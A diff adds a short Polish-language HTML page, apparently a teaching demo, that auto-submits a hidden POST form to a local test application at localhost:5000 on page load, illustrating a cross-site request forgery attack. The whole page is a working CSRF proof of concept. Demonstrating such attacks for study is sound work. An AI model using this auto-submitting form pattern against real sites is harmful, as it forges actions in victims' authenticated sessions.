@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Złośliwa Strona – Atak CSRF</title>
+</head>
+<body onload="document.forms[0].submit()">
+    <h1>Próbujemy przelać Twoje pieniądze...</h1>
+    <p>Twoja sesja jest aktywna – atak CSRF w toku!</p>
+
+    <form action="http://localhost:5000/Home/Submit" method="POST">
+    	<input type="hidden" name="message" value="Atak CSRF!" />
+    </form>
+</body>
+</html>
